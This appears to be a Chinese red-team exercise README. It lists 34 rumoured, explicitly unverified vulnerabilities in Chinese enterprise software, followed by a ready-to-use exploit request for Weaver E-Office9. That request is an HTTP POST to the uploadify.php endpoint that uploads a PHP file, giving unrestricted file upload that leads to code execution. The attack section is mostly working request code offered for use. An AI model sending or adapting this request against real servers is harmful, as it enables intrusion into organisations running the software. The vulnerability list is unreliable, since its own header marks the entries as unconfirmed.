# 2023HW

## 序号 更新时间 漏洞名称(待验证)
1 2023/8/9 深信服应用交付系统命令执行

2 2023/8/9 协同办公文档（DzzOfffice）未授权访问

3 2023/8/9 泛微OA前台代码执行漏洞

4 2023/8/9 泛微oa进后台漏洞

5 2023/8/9 ucloud的未授权获取任意用户cookie

6 2023/8/9 飞书客户端RCE漏洞

7 2023/8/9 泛微Eoffice V10前台RCE

8 2023/8/9 来客推商城任意文件上传

9 2023/8/9 天玥堡垒机0day

10 2023/8/9 明御运维审计与风险控制系统堡垒机任意用户注册

11 2023/8/9 XX协同管理系统存在SQL注入

12 2023/8/9 泛微emobile 注入漏洞

13 2023/8/9 海康威视综合安防前台文件上传漏洞

14 2023/8/9 蓝凌OA前台代码执行漏洞

15 2023/8/9 致远M3Server-xxxx反序列化漏洞

16 2023/8/9 致远A8 V8 SP1 SP2文件上传漏洞

17 2023/8/9 普元EOS前台代码执行漏洞

18 2023/8/9 泛微E-cology后台文件上传漏洞

19 2023/8/9 泛微E-Mobile任意用户登录

20 2023/8/9 泛微E-Office10信息泄露后台+后台文件上传漏洞

21 2023/8/9 契约锁电子签章系统RCE

22 2023/8/9 亿赛通电子文档平台文件上传漏洞

23 2023/8/9 Idocview命令执行漏洞

24 2023/8/9 jeesite代码执行漏洞

25 2023/8/9 LiveBOS文件上传漏洞

26 2023/8/9 用友nc-cloud-任意文件写入

27 2023/8/9 奇安信VPN PWN

28 2023/8/9 xx IOA PWN

29 2023/8/9 xxx准入 PWN

30 2023/8/9 eoffice9 前台文件包含

31 2023/8/9 泛微 E-Cology ifNewsCheckOutByCurrentUser SQL注入漏洞

32 2023/8/9 fastjson版本<2.0.27存在高危反序列化漏洞

33 2023/8/9 WPS 0day

34 2023/8/9 帆软channel序列化

## fanwei OA EXP

描述和影响范围

Weaver E-Office9版本存在代码问题漏洞，该漏洞源于文件/inc/jquery/uploadify/uploadify.php存在问题，对参数Filedata的操作会导致不受限制的上传。
Weaver E-Office9.0
POC or EXP


```POST /inc/jquery/uploadify/uploadify.php HTTP/1.1
Host: 192.168.232.137:8082
User-Agent: test
Connection: close
Content-Length: 493
Accept-Encoding: gzip
Content-Type: multipart/form-data; boundary=25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85

--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85
Content-Disposition: form-data; name="Filedata"; filename="666.php"
Content-Type: application/octet-stream

<?php phpinfo();?>

--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85--
--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85
Content-Disposition: form-data; name="file"; filename=""
Content-Type: application/octet-stream

--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85--```
